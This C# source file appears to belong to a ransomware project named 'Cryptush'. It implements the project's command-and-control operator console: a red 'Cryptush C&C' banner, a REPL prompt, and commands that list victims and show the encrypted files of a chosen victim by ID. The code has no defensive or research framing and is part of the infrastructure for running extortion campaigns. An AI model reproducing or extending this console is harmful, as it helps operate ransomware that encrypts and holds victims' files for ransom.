using Figgle;
using NClap.Metadata;
using NClap.Repl;
using NClap.Utilities;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace Server.lib
{
    class CLI
    {
        enum MyCommandType
        {
            [Command(typeof(ListCommand), Description = "Lists all victims")]
            list,
            [Command(typeof(FilesCommand), Description = "Displays encrypted files list of a selected victim")]
            files,
            [Command(typeof(ClearCommand), Description = "Clears the shell")]
            clear,
            [Command(typeof(ExitCommand), Description = "Exits the shell")]
            exit
        }

        class ListCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Db.ListVictims();
                return Task.FromResult(CommandResult.Success);
            }
        }
        class FilesCommand : Command
        {
            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "The victim's ID")]
            public string VictimToken { get; set; }
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Db.ListFiles(VictimToken);
                return Task.FromResult(CommandResult.Success);
            }
        }
        class ClearCommand : Command
        {
            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
            {
                Console.Clear();
                return Task.FromResult(CommandResult.Success);
            }
        }
        public static void Start()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(FiggleFonts.Doom.Render("Cryptush C&C"));          
            Console.WriteLine("\n");
            Console.ForegroundColor = ConsoleColor.Gray;

            var ioParams = new LoopInputOutputParameters
            {
                Prompt = ColoredString.FromString("Cryptush# ")
            };
            var loop = new Loop(typeof(MyCommandType), ioParams);
            loop.Execute();
        }
    }
}
